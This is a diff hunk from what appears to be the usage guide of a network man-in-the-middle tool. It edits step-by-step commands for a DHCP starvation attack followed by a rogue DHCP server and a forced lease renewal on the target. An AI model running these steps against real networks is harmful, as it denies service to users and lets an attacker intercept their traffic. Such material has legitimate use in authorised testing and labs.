@@ -34,7 +34,7 @@ sudo ./mitm -mode dhcp -offer <ip_to_offer>
 
 ### Full DHCP Attack (Starvation + Rogue Server)
 
-1. Run starvation: `sudo ./mitm -mode dhcp-starve -count 150`
+1. Run starvation: `sudo ./mitm -mode dhcp-starve -count <n>` (make sure count is enough to exhaust the DHCP pool)
 2. Start rogue server: `sudo ./mitm -mode dhcp -offer <ip_to_offer>`
 3. On target: `sudo dhclient -r && sudo dhclient`
 
